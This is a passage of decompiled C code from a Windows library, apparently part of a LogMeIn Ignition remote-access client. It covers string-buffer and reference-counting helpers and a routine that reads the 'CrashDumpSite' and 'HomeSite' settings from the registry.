      uVar4 = uVar5 + 0xf & 0xfffffff0;
    }
    else {
      uVar4 = uVar4 + 0xffff & 0xffff0000;
    }
    piVar2 = (int *)FUN_100581b4(uVar4 * 2 + 0xe);
    iVar3 = local_c;
    if (piVar2 != (int *)0x0) {
      piVar2[1] = uVar4;
      *piVar2 = 0;
      piVar2[2] = 0;
      *(undefined2 *)(piVar2 + 3) = 0;
      LOCK();
      iVar1 = *param_1;
      *param_1 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(param_1);
        iVar3 = local_c;
      }
    }
  }
  if (piVar2 == (int *)0x0) {
    if (param_1 != (int *)0x0) {
      LOCK();
      iVar3 = *param_1;
      *param_1 = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(param_1);
      }
    }
  }
  else if (iVar3 == 0) {
    piVar2[2] = 0;
    *(undefined2 *)((int)piVar2 + piVar2[2] * 2 + 0xc) = 0;
  }
  else {
    piVar2[2] = iVar3;
    FUN_1005d740(piVar2 + 3,param_2,iVar3 * 2);
    *(undefined2 *)((int)piVar2 + piVar2[2] * 2 + 0xc) = 0;
  }
  if ((local_5 != '\0') && (param_1 != (int *)0x0)) {
    LOCK();
    iVar3 = *param_1;
    *param_1 = *param_1 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(param_1);
    }
  }
  return piVar2;
}



/* Function: FUN_1000bfa0 */

int __thiscall FUN_1000bfa0(int param_1,short *param_2,int param_3)

{
  short sVar1;
  uint uVar2;
  bool bVar3;
  int iVar4;
  short *psVar5;
  uint local_c;
  
  local_c = 0;
  if (((param_1 == 0) || (param_2 < (short *)(param_1 + 0xcU))) ||
     ((short *)(param_1 + (*(int *)(param_1 + 4) + 6) * 2) <= param_2)) {
    bVar3 = false;
    if (param_3 == -1) {
      if (param_2 == (short *)0x0) {
        return param_1;
      }
      psVar5 = param_2;
      do {
        sVar1 = *psVar5;
        psVar5 = psVar5 + 1;
      } while (sVar1 != 0);
      param_3 = (int)psVar5 - (int)(param_2 + 1) >> 1;
    }
  }
  else {
    uVar2 = *(uint *)(param_1 + 8);
    bVar3 = true;
    local_c = (int)param_2 + (-0xc - param_1) >> 1;
    if (uVar2 < local_c) {
      return param_1;
    }
    if ((param_3 == -1) || (uVar2 < local_c + param_3)) {
      param_3 = uVar2 - local_c;
    }
  }
  if (param_3 != 0) {
    if (param_1 == 0) {
      iVar4 = 0;
    }
    else {
      iVar4 = *(int *)(param_1 + 8);
    }
    iVar4 = FUN_10010370(iVar4 + 1 + param_3,1);
    if (iVar4 != 0) {
      if (bVar3) {
        param_2 = (short *)(iVar4 + (local_c + 6) * 2);
      }
      FUN_1005d740(iVar4 + (*(int *)(iVar4 + 8) + 6) * 2,param_2,param_3 * 2);
      *(int *)(iVar4 + 8) = *(int *)(iVar4 + 8) + param_3;
      *(undefined2 *)(iVar4 + 0xc + *(int *)(iVar4 + 8) * 2) = 0;
      return iVar4;
    }
  }
  return param_1;
}



/* Function: FUN_1000c0a0 */

int * __thiscall FUN_1000c0a0(int *param_1,undefined4 param_2,undefined4 param_3)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  
  if (param_1 != (int *)0x0) {
    if (*param_1 == 0) {
      param_1[2] = 0;
      *(undefined2 *)(param_1 + 3) = 0;
      uVar4 = param_1[1];
      uVar1 = FUN_1004a970(param_2,param_3);
      if (uVar1 < uVar4) {
        param_1[2] = param_1[2] + uVar1;
        return param_1;
      }
      piVar2 = (int *)FUN_10010290(uVar1);
      if (piVar2 != (int *)0x0) {
        iVar3 = FUN_1004a970(param_2,param_3);
        piVar2[2] = piVar2[2] + iVar3;
        return piVar2;
      }
      return (int *)0x0;
    }
    LOCK();
    iVar3 = *param_1;
    *param_1 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(param_1);
    }
  }
  iVar3 = FUN_1004a970(param_2,param_3);
  if ((iVar3 != 0) && (iVar3 != -1)) {
    uVar4 = 0x10;
    if (0x10 < iVar3 + 1U) {
      uVar4 = iVar3 + 1U;
    }
    uVar4 = uVar4 + 0xf & 0xfffffff0;
    piVar2 = (int *)FUN_100581b4(uVar4 * 2 + 0xe);
    if (piVar2 != (int *)0x0) {
      piVar2[1] = uVar4;
      *piVar2 = 0;
      piVar2[2] = 0;
      *(undefined2 *)(piVar2 + 3) = 0;
      iVar3 = FUN_1004a970(param_2,param_3);
      piVar2[2] = piVar2[2] + iVar3;
      return piVar2;
    }
  }
  return (int *)0x0;
}



/* Function: FUN_1000c1a0 */

int * __thiscall FUN_1000c1a0(int *param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_1 == (int *)0x0) {
LAB_1000c221:
    uVar4 = 0;
  }
  else {
    if (*param_1 != 0) {
      iVar1 = FUN_1004a970(param_2,param_3);
      if (iVar1 == 0) {
        return param_1;
      }
      piVar2 = (int *)FUN_10010370(param_1[2] + iVar1,1);
      if (piVar2 == (int *)0x0) {
        return param_1;
      }
      goto LAB_1000c1e5;
    }
    if (param_1 == (int *)0x0) goto LAB_1000c221;
    uVar4 = param_1[1] - param_1[2];
  }
  uVar3 = FUN_1004a970(param_2,param_3);
  if (uVar3 < uVar4) {
    param_1[2] = param_1[2] + uVar3;
    return param_1;
  }
  if (param_1 == (int *)0x0) {
    iVar1 = 0;
  }
  else {
    iVar1 = param_1[2];
  }
  piVar2 = (int *)FUN_10010290(iVar1 + uVar3);
  if (piVar2 == (int *)0x0) {
    if (param_1 != (int *)0x0) {
      *(undefined2 *)((int)param_1 + param_1[2] * 2 + 0xc) = 0;
    }
    return param_1;
  }
LAB_1000c1e5:
  iVar1 = FUN_1004a970(param_2,param_3);
  piVar2[2] = piVar2[2] + iVar1;
  return piVar2;
}



/* Function: FUN_1000c280 */

void __fastcall FUN_1000c280(int *param_1)

{
  if (*param_1 != 0) {
    FUN_100579ee(*param_1);
  }
  return;
}



/* Function: FUN_1000c290 */

int * __thiscall FUN_1000c290(int *param_1,undefined4 param_2,undefined4 param_3)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  
  if (param_1 != (int *)0x0) {
    if (*param_1 == 0) {
      param_1[2] = 0;
      *(undefined1 *)(param_1 + 3) = 0;
      uVar4 = param_1[1];
      uVar1 = FUN_1004a8b0(param_2,param_3);
      if (uVar1 < uVar4) {
        param_1[2] = param_1[2] + uVar1;
        return param_1;
      }
      piVar2 = (int *)FUN_100073c0(uVar1);
      if (piVar2 == (int *)0x0) {
        return (int *)0x0;
      }
      iVar3 = FUN_1004a8b0(param_2,param_3);
      piVar2[2] = piVar2[2] + iVar3;
      return piVar2;
    }
    LOCK();
    iVar3 = *param_1;
    *param_1 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(param_1);
    }
  }
  iVar3 = FUN_1004a8b0(param_2,param_3);
  if ((iVar3 != 0) && (iVar3 != -1)) {
    uVar4 = 0x10;
    if (0x10 < iVar3 + 1U) {
      uVar4 = iVar3 + 1U;
    }
    uVar4 = uVar4 + 0xf & 0xfffffff0;
    piVar2 = (int *)FUN_100581b4(uVar4 + 0xf);
    if (piVar2 != (int *)0x0) {
      piVar2[1] = uVar4;
      *piVar2 = 0;
      piVar2[2] = 0;
      *(undefined1 *)(piVar2 + 3) = 0;
      iVar3 = FUN_1004a8b0(param_2,param_3);
      piVar2[2] = piVar2[2] + iVar3;
      return piVar2;
    }
  }
  return (int *)0x0;
}



/* Function: FUN_1000c390 */

int * FUN_1000c390(int *param_1)

{
  uint uVar1;
  int *piVar2;
  uint uVar3;
  int iVar4;
  int *piVar5;
  undefined1 local_28 [12];
  _Lockit local_1c [4];
  _Lockit local_18 [4];
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074558;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  std::_Lockit::_Lockit(local_1c,0);
  piVar2 = DAT_1009acd4;
  local_8 = 0;
  local_14 = DAT_1009acd4;
  if (DAT_100980a0 == 0) {
    std::_Lockit::_Lockit(local_18,0);
    if (DAT_100980a0 == 0) {
      DAT_10098090 = DAT_10098090 + 1;
      DAT_100980a0 = DAT_10098090;
    }
    std::_Lockit::~_Lockit(local_18);
  }
  uVar1 = DAT_100980a0;
  iVar4 = *param_1;
  if (DAT_100980a0 < *(uint *)(iVar4 + 0xc)) {
    piVar5 = *(int **)(*(int *)(iVar4 + 8) + DAT_100980a0 * 4);
    if (piVar5 != (int *)0x0) goto LAB_1000c48d;
  }
  else {
    piVar5 = (int *)0x0;
  }
  if (*(char *)(iVar4 + 0x14) == '\0') {
LAB_1000c439:
    if (piVar5 != (int *)0x0) goto LAB_1000c48d;
  }
  else {
    iVar4 = FUN_10056caf(uVar3);
    if (uVar1 < *(uint *)(iVar4 + 0xc)) {
      piVar5 = *(int **)(*(int *)(iVar4 + 8) + uVar1 * 4);
      goto LAB_1000c439;
    }
  }
  piVar5 = piVar2;
  if (piVar2 == (int *)0x0) {
    iVar4 = FUN_100084e0(&local_14,param_1);
    if (iVar4 == -1) {
      FUN_1005851c("bad cast");
      FUN_1005de1b(local_28,&DAT_10092fd0);
    }
    piVar5 = local_14;
    DAT_1009acd4 = local_14;
    (**(code **)(*local_14 + 4))();
    Facet_Register(piVar5);
  }
LAB_1000c48d:
  std::_Lockit::~_Lockit(local_1c);
  ExceptionList = local_10;
  return piVar5;
}



/* Function: FUN_1000c4b0 */

void __fastcall FUN_1000c4b0(int param_1)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined1 local_20 [28];
  
  iVar1 = FUN_103e86ef();
  if (iVar1 != 0) {
    iVar1 = FUN_105aaad7(*(undefined4 *)(param_1 + 0x14));
    if ((iVar1 != -1) &&
       (iVar1 = FUN_10319659(extraout_ECX,*(undefined4 *)(param_1 + 0x14),local_20), iVar1 != 0)) {
      return;
    }
    FUN_101feb29(local_20);
    (*DAT_1007945c)(local_20);
  }
  return;
}



/* Function: FUN_1000c510 */

undefined4 FUN_1000c510(void)

{
  return 0;
}



/* Function: FUN_1000c520 */

undefined4 __fastcall FUN_1000c520(int *param_1,undefined4 param_2,undefined4 *param_3)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  undefined4 uVar4;
  undefined4 extraout_ECX;
  int local_68;
  int *local_64;
  undefined4 local_60;
  int local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  int local_40 [3];
  undefined4 local_34;
  undefined4 local_30;
  int local_2c;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 local_c;
  
  puStack_10 = &LAB_10074590;
  local_14 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xffffff90;
  if ((*param_1 == 0) || (*param_1 == -0xc)) {
    return 0;
  }
  local_5c = 0;
  local_58 = 0;
  local_54 = 0;
  local_50 = 0;
  local_4c = 0;
  local_48 = 0;
  local_44 = 1;
  local_60 = 0;
  local_c = 0;
  ExceptionList = &local_14;
  FUN_1000e7e0(param_2,param_1);
  FUN_1000f000(extraout_ECX);
  local_c = CONCAT31(local_c._1_3_,1);
  iVar3 = *param_1;
  if ((iVar3 != 0) && (*(int *)(iVar3 + 8) != 0)) {
    if (iVar3 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = iVar3 + 0xc;
    }
    iVar3 = FUN_1000e8d0(iVar3,local_40,0);
    if ((iVar3 != 0) && (local_40[0] != 0)) {
      local_64 = (int *)0x0;
      local_68 = 0;
      FUN_1000efb0(0,&local_64,&local_68);
      FUN_1000ad00(local_64,local_68 - (int)local_64 >> 1);
      piVar1 = local_64;
      uVar4 = FUN_10010440(local_64);
      *param_3 = uVar4;
      if (piVar1 != (int *)0x0) {
        LOCK();
        iVar3 = *piVar1;
        *piVar1 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(piVar1);
        }
      }
      uVar4 = 1;
      goto LAB_1000c669;
    }
  }
  uVar4 = 0;
LAB_1000c669:
  if (local_2c != 0) {
    FUN_100579ee(local_2c,uVar2);
  }
  thunk_FUN_100579ee(local_30);
  local_30 = 0;
  thunk_FUN_100579ee(local_34);
  local_34 = 0;
  if (local_5c != 0) {
    FUN_100579ee(local_5c);
  }
  ExceptionList = local_14;
  return uVar4;
}



/* Function: FUN_1000c6e0 */

undefined4 * FUN_1000c6e0(void)

{
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100745be;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if ((DAT_1009accc & 1) == 0) {
    DAT_1009accc = DAT_1009accc | 1;
    local_8 = 0;
    DAT_1009acc8 = FUN_100146c0(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  }
  ExceptionList = local_10;
  return &DAT_1009acc8;
}



/* Function: FUN_1000c740 */

undefined4 * __fastcall FUN_1000c740(undefined4 *param_1)

{
  if ((DAT_1009acc4 & 1) == 0) {
    DAT_1009acc4 = DAT_1009acc4 | 1;
    DAT_1009acc0 = *param_1;
  }
  return &DAT_1009acc0;
}



/* Function: FUN_1000c760 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined * __fastcall FUN_1000c760(undefined4 *param_1)

{
  if ((DAT_1009b444 & 1) == 0) {
    DAT_1009b444 = DAT_1009b444 | 1;
    _DAT_1009b448 = *param_1;
  }
  return &DAT_1009b448;
}



/* Function: FUN_1000c780 */

undefined4 * __fastcall FUN_1000c780(undefined4 *param_1)

{
  if ((DAT_1009b44c & 1) == 0) {
    DAT_1009b44c = DAT_1009b44c | 1;
    DAT_1009b450 = *param_1;
  }
  return &DAT_1009b450;
}



/* Function: FUN_1000c7a0 */

undefined4 * FUN_1000c7a0(void)

{
  uint uVar1;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100745ee;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if ((DAT_1009acbc & 1) == 0) {
    DAT_1009acbc = DAT_1009acbc | 1;
    local_8 = 0;
    DAT_1009acb4 = 0;
    DAT_1009acb8 = 0;
    DAT_1009acb4 = FUN_1000fa00(0,0);
    FUN_10057b51(FUN_100783d0,uVar1);
  }
  ExceptionList = local_10;
  return &DAT_1009acb4;
}



/* Function: FUN_1000c820 */

int __thiscall FUN_1000c820(int *param_1,int *param_2)

{
  int iVar1;
  undefined4 *puVar2;
  int *piVar3;
  
  iVar1 = FUN_10010c00();
  if (iVar1 + (int)param_2 != 0) {
    puVar2 = (undefined4 *)FUN_1000e640(&param_2,0,iVar1 + (int)param_2);
    iVar1 = FUN_10010440(*puVar2);
    *param_1 = iVar1;
    if (param_2 != (int *)0x0) {
      LOCK();
      iVar1 = *param_2;
      *param_2 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(param_2);
      }
    }
    goto LAB_1000c89f;
  }
  piVar3 = (int *)*param_1;
  if (piVar3 == (int *)0x0) {
LAB_1000c89b:
    piVar3 = (int *)0x0;
  }
  else {
    if (*piVar3 != 0) {
      LOCK();
      iVar1 = *piVar3;
      *piVar3 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
      goto LAB_1000c89b;
    }
    piVar3[2] = 0;
    *(undefined2 *)(piVar3 + 3) = 0;
  }
  *param_1 = (int)piVar3;
LAB_1000c89f:
  if (*param_1 != 0) {
    return *param_1 + 0xc;
  }
  return 0;
}



/* Function: FUN_1000c8c0 */

int __fastcall FUN_1000c8c0(int *param_1)

{
  FUN_1000c820(1);
  if (*param_1 != 0) {
    return *param_1 + 0xc;
  }
  return 0;
}



/* Function: FUN_1000c8e0 */

int __fastcall FUN_1000c8e0(int *param_1)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  int **ppiVar4;
  int *local_c;
  int *local_8;
  
  local_c = (int *)CONCAT22(local_c._2_2_,0x2e);
  local_8 = (int *)CONCAT22(local_8._2_2_,0x5c);
  iVar1 = FUN_10010d00();
  local_8 = (int *)(iVar1 + 1U);
  iVar2 = FUN_10010d00();
  local_c = (int *)(iVar2 + 1);
  ppiVar4 = &local_c;
  if ((int *)(iVar2 + 1) <= (int *)(iVar1 + 1U)) {
    ppiVar4 = &local_8;
  }
  puVar3 = (undefined4 *)FUN_1000e760(&local_c,0,*ppiVar4);
  iVar1 = FUN_10007010(*puVar3);
  *param_1 = iVar1;
  if (local_c != (int *)0x0) {
    LOCK();
    iVar1 = *local_c;
    *local_c = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_c);
    }
  }
  iVar1 = FUN_10007b60(&DAT_10083979,0xffffffff);
  *param_1 = iVar1;
  if (iVar1 != 0) {
    return iVar1 + 0xc;
  }
  return 0;
}



/* Function: FUN_1000c980 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void __thiscall FUN_1000c980(int param_1,int *param_2,char *param_3)

{
  ushort uVar1;
  undefined1 uVar2;
  char cVar3;
  undefined4 uVar4;
  int *piVar5;
  uint uVar6;
  int *piVar7;
  undefined4 *puVar8;
  int *piVar9;
  int iVar10;
  ushort *puVar11;
  ushort *puVar12;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined4 extraout_ECX_08;
  undefined4 extraout_ECX_09;
  undefined4 extraout_ECX_10;
  undefined4 extraout_ECX_11;
  undefined4 extraout_ECX_12;
  bool bVar13;
  undefined4 uVar14;
  wchar_t *pwVar15;
  undefined4 uVar16;
  wchar_t *pwVar17;
  wchar_t *pwVar18;
  int *local_34;
  int *local_30;
  int *local_2c;
  int *local_28;
  int *local_24;
  int local_20;
  int local_1c;
  int local_18;
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1007471b;
  local_10 = ExceptionList;
  local_14 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_2c = param_2;
  *(undefined4 *)(param_1 + 4) = 200;
  uVar4 = FUN_100075b0(local_14);
  *(undefined4 *)(param_1 + 8) = uVar4;
  *(undefined4 *)(param_1 + 0xc) = 200;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *(undefined4 *)(param_1 + 0x14) = 0;
  *(undefined4 *)(param_1 + 0x18) = 0;
  *(undefined4 *)(param_1 + 0x1c) = 0;
  local_8 = 1;
  *(undefined4 *)(param_1 + 0x20) = 0;
  *(undefined4 *)(param_1 + 0x24) = 0;
  uVar4 = FUN_1000fa00(0,0);
  *(undefined4 *)(param_1 + 0x20) = uVar4;
  local_34 = (int *)(param_1 + 0x28);
  uVar4 = FUN_1000bd10();
  *(undefined4 *)(param_1 + 0x28) = uVar4;
  uVar4 = FUN_1000bd10();
  *(undefined4 *)(param_1 + 0x2c) = uVar4;
  uVar4 = FUN_1000bd10();
  *(undefined4 *)(param_1 + 0x30) = uVar4;
  uVar4 = FUN_1000bd10();
  *(undefined4 *)(param_1 + 0x34) = uVar4;
  if ((local_2c == (int *)0x0) || ((char)*local_2c != '\0')) {
    uVar4 = FUN_100075b0();
  }
  else {
    uVar4 = FUN_10007ae0();
  }
  *(undefined4 *)(param_1 + 0x38) = uVar4;
  if ((param_3 == (char *)0x0) || (*param_3 != '\0')) {
    uVar4 = FUN_100075b0();
  }
  else {
    uVar4 = FUN_10007ae0();
  }
  *(undefined4 *)(param_1 + 0x3c) = uVar4;
  *(undefined4 *)(param_1 + 0x40) = 0;
  *(undefined4 *)(param_1 + 0x44) = 0;
  *(undefined4 *)(param_1 + 0x48) = 0;
  *(undefined4 *)(param_1 + 0x4c) = 0;
  if ((DAT_1009b5d4 & 1) == 0) {
    DAT_1009b5d4 = DAT_1009b5d4 | 1;
    _DAT_1009b5d8 = DAT_1009abd0;
    if (DAT_1009abd0 != (int *)0x0) {
      LOCK();
      *DAT_1009abd0 = *DAT_1009abd0 + 1;
      UNLOCK();
    }
    _DAT_1009b5dc = DAT_1009abd4;
    if (DAT_1009abd4 != (int *)0x0) {
      LOCK();
      *DAT_1009abd4 = *DAT_1009abd4 + 1;
      UNLOCK();
    }
    local_8._0_1_ = 0xd;
    if ((DAT_10099158 & 1) == 0) {
      DAT_10099158 = DAT_10099158 | 1;
      FUN_100064d0();
      FUN_10057b51(&LAB_10078190);
    }
    _DAT_1009b5e0 = &DAT_100990d8;
    _DAT_1009b5e4 = 0;
    _DAT_1009b5e8 = 0;
    _DAT_1009b5e4 = FUN_10017840();
    local_8 = CONCAT31(local_8._1_3_,0xe);
    DAT_1009b5ec = (int *)0x0;
    _DAT_1009b5f0 = 0;
    DAT_1009b5ec = (int *)FUN_10017840();
    _DAT_1009b5f4 = _DAT_1008c410;
    DAT_1009b5f8 = _UNK_1008c414;
    DAT_1009b5fc = _UNK_1008c418;
    DAT_1009b600 = _UNK_1008c41c;
    FUN_10057b51(&LAB_10078890);
  }
  piVar5 = (int *)FUN_1000bd10();
  local_8._0_1_ = 0x14;
  local_30 = piVar5;
  if (DAT_1009b5f8 == 2) {
    piVar9 = (int *)FUN_1000bd10();
    local_28 = piVar9;
    piVar7 = (int *)FUN_1001d340(&local_28);
    if ((piVar7 == DAT_1009b5ec) ||
       (cVar3 = FUN_1001d1f0(&local_28,piVar7 + 4), local_2c = piVar7, cVar3 != '\0')) {
      local_2c = DAT_1009b5ec;
    }
    piVar7 = local_2c;
    if (piVar9 != (int *)0x0) {
      LOCK();
      iVar10 = *piVar9;
      *piVar9 = iVar10 + -1;
      UNLOCK();
      if (iVar10 + -1 < 0) {
        FUN_100579ee(piVar9);
      }
    }
    if (DAT_1009b5ec == piVar7) {
      if (DAT_1009b5fc == 0) {
        local_2c = (int *)FUN_10058463(0x40,&DAT_10098020);
        local_8._0_1_ = 0x15;
        if (local_2c == (int *)0x0) {
          DAT_1009b5fc = 0;
        }
        else {
          uVar4 = FUN_1003abd0();
          DAT_1009b5fc = FUN_1003c970(uVar4);
        }
        local_8._0_1_ = 0x14;
        uVar2 = (undefined1)local_8;
        local_8._0_1_ = 0x14;
        if (DAT_1009b5fc != 0) {
          local_8._0_1_ = uVar2;
          FUN_1003ade0();
          FUN_1003aff0();
          if (DAT_1009b5fc != 0) goto LAB_1000cd67;
          goto LAB_1000ceaf;
        }
        FUN_1000ad00(L"CrashDumpSite",0xffffffff);
        local_8._0_1_ = 0x16;
        puVar8 = (undefined4 *)FUN_1001d190(&local_28);
        uVar4 = FUN_10010440(piVar5);
        *puVar8 = uVar4;
      }
      else {
LAB_1000cd67:
        iVar10 = FUN_1003cb30(DAT_1009b5fc,&DAT_10088e54);
        if (((iVar10 != 0) && (iVar10 = FUN_1003cb30(extraout_ECX,&DAT_10088e54), iVar10 != 0)) &&
           (iVar10 = FUN_1003cb30(extraout_ECX_00,L"Software"), iVar10 != 0)) {
          pwVar17 = L"LogMeIn Ignition";
          pwVar15 = L"Software";
          uVar4 = extraout_ECX_01;
          uVar14 = extraout_ECX_01;
          FUN_1003cb30(extraout_ECX_01,&DAT_10088e54);
          FUN_1003cb30(uVar4,pwVar15);
          iVar10 = FUN_1003cb10(uVar14,pwVar17);
          if (iVar10 != 0) {
            pwVar18 = L"Settings";
            pwVar17 = L"LogMeIn Ignition";
            pwVar15 = L"Software";
            uVar4 = extraout_ECX_02;
            uVar14 = extraout_ECX_02;
            uVar16 = extraout_ECX_02;
            FUN_1003cb30(extraout_ECX_02,&DAT_10088e54);
            FUN_1003cb30(uVar4,pwVar15);
            FUN_1003cb30(uVar14,pwVar17);
            iVar10 = FUN_1003cb10(uVar16,pwVar18);
            if (iVar10 != 0) {
              pwVar18 = L"Settings";
              pwVar17 = L"LogMeIn Ignition";
              pwVar15 = L"Software";
              uVar4 = extraout_ECX_03;
              uVar14 = extraout_ECX_03;
              uVar16 = extraout_ECX_03;
              FUN_1003cb30(extraout_ECX_03,&DAT_10088e54);
              FUN_1003cb30(uVar4,pwVar15);
              FUN_1003cb30(uVar14,pwVar17);
              FUN_1003cb30(uVar16,pwVar18);
              iVar10 = FUN_1003cb10(extraout_ECX_04,L"CrashDumpSite");
              if (iVar10 == 0) {
                FUN_1003cd30(L"string",extraout_ECX_05,L"CrashDumpSite");
                puVar8 = (undefined4 *)FUN_1003cce0();
                uVar4 = FUN_10010440(piVar5);
                *puVar8 = uVar4;
              }
              else {
                FUN_1003cb30(extraout_ECX_05,L"CrashDumpSite");
                puVar8 = (undefined4 *)FUN_1003cce0();
                piVar5 = (int *)FUN_10010440(*puVar8);
                local_30 = piVar5;
              }
            }
          }
        }
LAB_1000ceaf:
        local_28 = (int *)FUN_1000bd10();
        local_8._0_1_ = 0x17;
        puVar8 = (undefined4 *)FUN_1001d190(&local_28);
        uVar4 = FUN_10010440(piVar5);
        *puVar8 = uVar4;
      }
      local_8._0_1_ = 0x14;
      if (local_28 != (int *)0x0) {
        local_8._0_1_ = 0x14;
        LOCK();
        iVar10 = *local_28;
        *local_28 = iVar10 + -1;
        UNLOCK();
        if (iVar10 + -1 < 0) {
          FUN_100579ee(local_28);
        }
      }
    }
    else {
      local_30 = (int *)FUN_10010440(piVar7[5]);
    }
  }
  else {
    FUN_1001c6f0(L"CrashDumpSite",&local_30,0,1);
  }
  FUN_1000e5b0();
  piVar5 = local_30;
  if ((local_30 == (int *)0x0) || (puVar11 = (ushort *)(local_30 + 3), puVar11 == (ushort *)0x0)) {
LAB_1000cf05:
    if (DAT_1009b5f8 == 2) {
      piVar9 = (int *)FUN_1000bd10();
      local_28 = piVar9;
      piVar7 = (int *)FUN_1001d340(&local_28);
      if ((piVar7 == DAT_1009b5ec) ||
         (cVar3 = FUN_1001d1f0(&local_28,piVar7 + 4), local_2c = piVar7, cVar3 != '\0')) {
        local_2c = DAT_1009b5ec;
      }
      piVar7 = local_2c;
      if (piVar9 != (int *)0x0) {
        LOCK();
        iVar10 = *piVar9;
        *piVar9 = iVar10 + -1;
        UNLOCK();
        if (iVar10 + -1 < 0) {
          FUN_100579ee(piVar9);
        }
      }
      if (DAT_1009b5ec == piVar7) {
        if (DAT_1009b5fc == 0) {
          local_2c = (int *)FUN_10058463(0x40,&DAT_10098020);
          local_8._0_1_ = 0x18;
          if (local_2c == (int *)0x0) {
            DAT_1009b5fc = 0;
          }
          else {
            uVar4 = FUN_1003abd0();
            DAT_1009b5fc = FUN_1003c970(uVar4);
          }
          local_8._0_1_ = 0x14;
          if (DAT_1009b5fc != 0) {
            FUN_1003ade0();
            FUN_1003aff0();
            if (DAT_1009b5fc != 0) goto LAB_1000d02d;
            goto LAB_1000d175;
          }
          FUN_1000ad00(L"HomeSite",0xffffffff);
          local_8._0_1_ = 0x19;
        }
        else {
LAB_1000d02d:
          iVar10 = FUN_1003cb30(DAT_1009b5fc,&DAT_10088e54);
          if (((iVar10 != 0) && (iVar10 = FUN_1003cb30(extraout_ECX_06,&DAT_10088e54), iVar10 != 0))
             && (iVar10 = FUN_1003cb30(extraout_ECX_07,L"Software"), iVar10 != 0)) {
            pwVar17 = L"LogMeIn Ignition";
            pwVar15 = L"Software";
            uVar4 = extraout_ECX_08;
            uVar14 = extraout_ECX_08;
            FUN_1003cb30(extraout_ECX_08,&DAT_10088e54);
            FUN_1003cb30(uVar4,pwVar15);
            iVar10 = FUN_1003cb10(uVar14,pwVar17);
            if (iVar10 != 0) {
              pwVar18 = L"Settings";
              pwVar17 = L"LogMeIn Ignition";
              pwVar15 = L"Software";
              uVar4 = extraout_ECX_09;
              uVar14 = extraout_ECX_09;
              uVar16 = extraout_ECX_09;
              FUN_1003cb30(extraout_ECX_09,&DAT_10088e54);
              FUN_1003cb30(uVar4,pwVar15);
              FUN_1003cb30(uVar14,pwVar17);
              iVar10 = FUN_1003cb10(uVar16,pwVar18);
              if (iVar10 != 0) {
                pwVar18 = L"Settings";
                pwVar17 = L"LogMeIn Ignition";
                pwVar15 = L"Software";
                uVar4 = extraout_ECX_10;
                uVar14 = extraout_ECX_10;
                uVar16 = extraout_ECX_10;
                FUN_1003cb30(extraout_ECX_10,&DAT_10088e54);
                FUN_1003cb30(uVar4,pwVar15);
                FUN_1003cb30(uVar14,pwVar17);
                FUN_1003cb30(uVar16,pwVar18);
                iVar10 = FUN_1003cb10(extraout_ECX_11,L"HomeSite");
                if (iVar10 == 0) {
                  FUN_1003cd30(L"string",extraout_ECX_12,L"HomeSite");
                  puVar8 = (undefined4 *)FUN_1003cce0();
                  uVar4 = FUN_10010440(piVar5);
                  *puVar8 = uVar4;
                }
                else {
                  FUN_1003cb30(extraout_ECX_12,L"HomeSite");
                  puVar8 = (undefined4 *)FUN_1003cce0();
                  piVar5 = (int *)FUN_10010440(*puVar8);
                  local_30 = piVar5;
                }
              }
            }
          }
LAB_1000d175:
          local_28 = (int *)FUN_1000bd10();
          local_8._0_1_ = 0x1a;
        }
        puVar8 = (undefined4 *)FUN_1001d190(&local_28);
        uVar4 = FUN_10010440(piVar5);
        *puVar8 = uVar4;
        local_8._0_1_ = 0x14;
        if (local_28 != (int *)0x0) {
          LOCK();
          iVar10 = *local_28;
          *local_28 = iVar10 + -1;
          UNLOCK();
